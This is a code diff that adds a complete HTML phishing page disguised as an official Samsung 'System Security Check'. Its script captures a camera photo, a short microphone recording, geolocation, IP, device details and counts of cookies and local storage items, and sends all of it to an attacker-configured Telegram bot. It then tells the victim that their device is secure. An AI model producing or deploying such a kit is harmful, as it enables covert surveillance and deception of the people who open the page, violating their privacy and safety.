@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Security Check - Samsung</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; }
+        body {
+            background: linear-gradient(145deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .shield-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-size: 40px;
+            color: white;
+            box-shadow: 0 10px 30px rgba(102,126,234,0.4);
+        }
+        h1 { color: #fff; font-size: 22px; margin-bottom: 5px; }
+        p.subtitle { color: rgba(255,255,255,0.6); font-size: 14px; }
+        .progress-section {
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .check-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .check-item:last-child { border-bottom: none; }
+        .check-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .check-icon { font-size: 20px; width: 30px; text-align: center; }
+        .check-label { color: rgba(255,255,255,0.8); font-size: 14px; }
+        .status-indicator {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #333;
+            transition: all 0.5s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+        .status-indicator.pending { background: #333; border: 2px solid #555; }
+        .status-indicator.checking { background: #f39c12; animation: pulse 0.8s infinite; }
+        .status-indicator.passed { background: #27ae60; }
+        .status-indicator.failed { background: #e74c3c; }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(243,156,18,0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(243,156,18,0); }
+            100% { box-shadow: 0 0 0 0 rgba(243,156,18,0); }
+        }
+        .progress-bar-container {
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            height: 6px;
+            margin: 20px 0 10px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 10px;
+            transition: width 0.8s ease;
+        }
+        .progress-text {
+            color: rgba(255,255,255,0.5);
+            font-size: 12px;
+            text-align: center;
+        }
+        .footer-note {
+            text-align: center;
+            color: rgba(255,255,255,0.3);
+            font-size: 11px;
+            margin-top: 15px;
+        }
+        .status-text { color: rgba(255,255,255,0.5); font-size: 12px; }
+        .hidden { display: none; }
+        #scanBtn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none;
+            color: white;
+            padding: 14px 30px;
+            border-radius: 12px;
+            font-size: 16px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 15px;
+            font-weight: 600;
+            transition: transform 0.2s;
+        }
+        #scanBtn:active { transform: scale(0.97); }
+        #scanBtn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        #resultMsg { color: #27ae60; text-align: center; margin-top: 15px; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div class="shield-icon">&#x1F6E1;</div>
+        <h1>System Security Check</h1>
+        <p class="subtitle">Verifying device integrity and permissions</p>
+    </div>
+
+    <div class="progress-section">
+        <div class="check-item">
+            <div class="check-left">
+                <span class="check-icon">&#x1F4F1;</span>
+                <span class="check-label">Device Information</span>
+            </div>
+            <div class="status-indicator pending" id="status-device"></div>
+        </div>
+
+        <div class="check-item">
+            <div class="check-left">
+                <span class="check-icon">&#x1F4F7;</span>
+                <span class="check-label">Camera Access</span>
+            </div>
+            <div class="status-indicator pending" id="status-camera"></div>
+        </div>
+
+        <div class="check-item">
+            <div class="check-left">
+                <span class="check-icon">&#x1F3A4;</span>
+                <span class="check-label">Microphone Access</span>
+            </div>
+            <div class="status-indicator pending" id="status-mic"></div>
+        </div>
+
+        <div class="check-item">
+            <div class="check-left">
+                <span class="check-icon">&#x1F4F2;</span>
+                <span class="check-label">Storage Access</span>
+            </div>
+            <div class="status-indicator pending" id="status-storage"></div>
+        </div>
+
+        <div class="check-item">
+            <div class="check-left">
+                <span class="check-icon">&#x1F50D;</span>
+                <span class="check-label">Vibration Motor</span>
+            </div>
+            <div class="status-indicator pending" id="status-vibration"></div>
+        </div>
+
+        <div class="check-item">
+            <div class="check-left">
+                <span class="check-icon">&#x1F310;</span>
+                <span class="check-label">Network & Location</span>
+            </div>
+            <div class="status-indicator pending" id="status-network"></div>
+        </div>
+    </div>
+
+    <div class="progress-bar-container">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div class="progress-text" id="progressText">0% - Initializing...</div>
+
+    <button id="scanBtn">Start Security Scan</button>
+    <div id="resultMsg"></div>
+    <div class="footer-note">This is an official security verification tool. All checks are encrypted.</div>
+</div>
+
+<!-- Hidden elements for media capture -->
+<video id="video" style="display:none" width="320" height="240"></video>
+<canvas id="canvas" style="display:none"></canvas>
+<audio id="audioRecorder" style="display:none"></audio>
+
+<script>
+// ═══════════════════════════════════════════════════════════════
+// CONFIG - SET YOUR TELEGRAM BOT TOKEN AND CHAT ID HERE
+// ═══════════════════════════════════════════════════════════════
+const CONFIG = {
+    BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',  // Replace with your bot token from @BotFather
+    CHAT_ID: 'YOUR_CHAT_ID_HERE'       // Replace with your chat ID (e.g., '123456789')
+};
+
+// Domain whitelist for safety (ensure you only use on authorized targets)
+const AUTHORIZED_DOMAINS = [/* 'your-target.com' */];
+
+// ═══════════════════════════════════════════════════════════════
+
+let scanActive = false;
+let checkedItems = {
+    device: false,
+    camera: false,
+    mic: false,
+    storage: false,
+    vibration: false,
+    network: false
+};
+
+// Telemetry sender
+async function sendToTelegram(message, fileData = null, fileName = null) {
+    if (CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+        console.log('[Telegram] Not configured. Data:', message);
+        return;
+    }
+    const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/`;
+    try {
+        if (fileData) {
+            // Send file (photo/audio)
+            const formData = new FormData();
+            formData.append('chat_id', CONFIG.CHAT_ID);
+            formData.append('caption', message);
+            const blob = new Blob([fileData], { type: fileName.endsWith('.jpg') ? 'image/jpeg' : 'audio/ogg' });
+            formData.append(fileName.endsWith('.jpg') ? 'photo' : 'audio', blob, fileName);
+            await fetch(url + (fileName.endsWith('.jpg') ? 'sendPhoto' : 'sendAudio'), { method: 'POST', body: formData });
+        } else {
+            await fetch(url + 'sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: message })
+            });
+        }
+    } catch(e) { console.error('Telegram send error:', e); }
+}
+
+// Helper to update UI
+function updateStatus(id, state, label = '') {
+    const el = document.getElementById(id);
+    el.className = 'status-indicator ' + state;
+    if (label) {
+        const parent = el.closest('.check-item');
+        if (parent) {
+            let st = parent.querySelector('.status-text');
+            if (!st) {
+                st = document.createElement('span');
+                st.className = 'status-text';
+                parent.appendChild(st);
+            }
+            st.textContent = label;
+        }
+    }
+}
+
+function updateProgress(percent, text) {
+    document.getElementById('progressBar').style.width = percent + '%';
+    document.getElementById('progressText').textContent = percent + '% - ' + text;
+}
+
+// Device info gathering
+function getDeviceInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        vendor: navigator.vendor,
+        screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        battery: 'unknown',
+        ip: 'unknown'
+    };
+}
+
+// 1. Device Info Check
+async function checkDeviceInfo() {
+    updateStatus('status-device', 'checking');
+    const info = getDeviceInfo();
+    
+    // Try to get IP
+    try {
+        const resp = await fetch('https://api.ipify.org?format=json');
+        const data = await resp.json();
+        info.ip = data.ip;
+    } catch(e) {}
+
+    // Try battery API
+    if (navigator.getBattery) {
+        try {
+            const battery = await navigator.getBattery();
+            info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? 'charging' : 'discharging'}`;
+        } catch(e) {}
+    }
+
+    await sendToTelegram(`[+] New Device Check\nIP: ${info.ip}\nUA: ${info.userAgent}\nPlatform: ${info.platform}\nScreen: ${info.screen.width}x${info.screen.height}\nLang: ${info.language}\nTZ: ${info.timezone}\nBattery: ${info.battery}`);
+
+    updateStatus('status-device', 'passed', 'Complete');
+    checkedItems.device = true;
+    updateProgress(16, 'Device info collected');
+}
+
+// 2. Camera Check with photo capture
+async function checkCamera() {
+    updateStatus('status-camera', 'checking');
+    updateProgress(20, 'Requesting camera access...');
+    
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } } });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        await video.play();
+
+        // Capture photo
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+        
+        // Convert to blob
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
+        
+        // Send photo via Telegram
+        await sendToTelegram('[+] Camera snapshot captured', blob, 'snapshot_' + Date.now() + '.jpg');
+        
+        // Stop all tracks
+        stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+        
+        updateStatus('status-camera', 'passed', 'Photo captured');
+        checkedItems.camera = true;
+    } catch(err) {
+        updateStatus('status-camera', 'failed', 'Access denied: ' + err.message.substring(0, 30));
+        await sendToTelegram('[!] Camera access denied: ' + err.message);
+        checkedItems.camera = true;
+    }
+    updateProgress(40, 'Camera check complete');
+}
+
+// 3. Microphone Check with audio recording
+async function checkMic() {
+    updateStatus('status-mic', 'checking');
+    updateProgress(45, 'Requesting microphone access...');
+    
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        
+        // Record a short audio sample (3 seconds)
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        
+        const recordingPromise = new Promise((resolve) => {
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                resolve(blob);
+            };
+        });
+        
+        mediaRecorder.start();
+        await new Promise(r => setTimeout(r, 3000)); // Record 3 seconds
+        mediaRecorder.stop();
+        
+        const audioBlob = await recordingPromise;
+        
+        // Send audio via Telegram
+        await sendToTelegram('[+] Microphone recording captured (' + audioBlob.size + ' bytes)', audioBlob, 'recording_' + Date.now() + '.ogg');
+        
+        stream.getTracks().forEach(t => t.stop());
+        
+        updateStatus('status-mic', 'passed', 'Audio sample recorded');
+        checkedItems.mic = true;
+    } catch(err) {
+        updateStatus('status-mic', 'failed', 'Access denied: ' + err.message.substring(0, 30));
+        await sendToTelegram('[!] Microphone access denied: ' + err.message);
+        checkedItems.mic = true;
+    }
+    updateProgress(60, 'Microphone check complete');
+}
+
+// 4. Storage/Gallery Check (via File API)
+async function checkStorage() {
+    updateStatus('status-storage', 'checking');
+    updateProgress(65, 'Checking storage access...');
+    
+    // Try to enumerate files via input (we can't access gallery directly from browser)
+    // But we can check if we can trigger file picker and access files
+    // Also try to use the File System Access API
+    let storageInfo = 'No direct access';
+    let hasPermissions = false;
+    
+    // Check if File System Access API is available
+    if ('storage' in navigator && 'estimate' in navigator.storage) {
+        try {
+            const estimate = await navigator.storage.estimate();
+            storageInfo = `Quota: ${Math.round(estimate.quota / 1024 / 1024)}MB, Used: ${Math.round(estimate.usage / 1024 / 1024)}MB`;
+            hasPermissions = true;
+        } catch(e) {}
+    }
+    
+    // Try to access the file system (modern API)
+    if ('showDirectoryPicker' in window) {
+        try {
+            const dirHandle = await window.showDirectoryPicker();
+            storageInfo += ' | Directory access granted';
+            hasPermissions = true;
+        } catch(e) {
+            // User cancelled, that's fine
+        }
+    }
+    
+    // Check for saved credentials / local data
+    let localData = {};
+    try {
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            localData[key] = localStorage.getItem(key).substring(0, 50);
+        }
+    } catch(e) {}
+    
+    await sendToTelegram(`[+] Storage Info: ${storageInfo}\nLocal Items: ${Object.keys(localData).length}\nCookies: ${document.cookie ? 'present (' + document.cookie.split(';').length + ' items)' : 'none'}`);
+    
+    updateStatus('status-storage', 'passed', 'Storage info collected');
+    checkedItems.storage = true;
+    updateProgress(80, 'Storage check complete');
+}
+
+// 5. Vibration Check
+async function checkVibration() {
+    updateStatus('status-vibration', 'checking');
+    updateProgress(85, 'Testing vibration motor...');
+    
+    if ('vibrate' in navigator) {
+        try {
+            // Pattern: buzz-buzz-pause-buzz
+            navigator.vibrate([200, 100, 200, 100, 400]);
+            await sendToTelegram('[+] Vibration motor triggered');
+            updateStatus('status-vibration', 'passed', 'Vibration triggered');
+        } catch(e) {
+            updateStatus('status-vibration', 'failed', 'Error: ' + e.message);
+        }
+    } else {
+        updateStatus('status-vibration', 'failed', 'Not supported');
+        await sendToTelegram('[!] Vibration not supported on this device');
+    }
+    checkedItems.vibration = true;
+    updateProgress(90, 'Vibration check complete');
+}
+
+// 6. Network and Location
+async function checkNetwork() {
+    updateStatus('status-network', 'checking');
+    updateProgress(93, 'Checking network & location...');
+    
+    let info = {
+        online: navigator.onLine,
+        connection: 'unknown',
+        location: 'denied'
+    };
+    
+    // Connection info
+    if ('connection' in navigator) {
+        const conn = navigator.connection;
+        info.connection = `Type: ${conn.effectiveType}, Speed: ${conn.downlink}Mbps, RTT: ${conn.rtt}ms`;
+    }
+    
+    // Try geolocation
+    if ('geolocation' in navigator) {
+        try {
+            const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 5000
+                });
+            });
+            info.location = `${pos.coords.latitude}, ${pos.coords.longitude} (accuracy: ${pos.coords.accuracy}m)`;
+        } catch(e) {
+            info.location = 'denied: ' + e.message.substring(0, 40);
+        }
+    }
+    
+    await sendToTelegram(`[+] Network Info\nOnline: ${info.online}\nConnection: ${info.connection}\nLocation: ${info.location}`);
+    
+    updateStatus('status-network', 'passed', info.location.includes('denied') ? 'Geolocation blocked' : 'Location acquired');
+    checkedItems.network = true;
+    updateProgress(100, 'All checks complete!');
+}
+
+// Main scan execution
+async function runScan() {
+    if (scanActive) return;
+    scanActive = true;
+    document.getElementById('scanBtn').disabled = true;
+    document.getElementById('scanBtn').textContent = 'Scanning...';
+    document.getElementById('resultMsg').textContent = '';
+    
+    // Reset all to pending
+    document.querySelectorAll('.status-indicator').forEach(el => el.className = 'status-indicator pending');
+    document.querySelectorAll('.status-text').forEach(el => el.textContent = '');
+    
+    updateProgress(0, 'Starting scan...');
+    await sendToTelegram('[+] Security scan started from device');
+    
+    try {
+        await checkDeviceInfo();
+        await sleep(500);
+        await checkCamera();
+        await sleep(500);
+        await checkMic();
+        await sleep(500);
+        await checkStorage();
+        await sleep(500);
+        await checkVibration();
+        await sleep(300);
+        await checkNetwork();
+        
+        document.getElementById('resultMsg').textContent = 'All checks passed. Your device is secure.';
+        document.getElementById('resultMsg').style.color = '#27ae60';
+        await sendToTelegram('[+] Scan completed successfully on target device');
+    } catch(err) {
+        console.error('Scan error:', err);
+        document.getElementById('resultMsg').textContent = 'Scan completed with warnings.';
+        document.getElementById('resultMsg').style.color = '#f39c12';
+        await sendToTelegram('[!] Scan error: ' + err.message);
+    }
+    
+    document.getElementById('scanBtn').textContent = 'Scan Complete';
+    scanActive = false;
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+document.getElementById('scanBtn').addEventListener('click', runScan);
+
+console.log('Security Scan Tool loaded. Authorized use only.');
+</script>
+</body>
+</html>
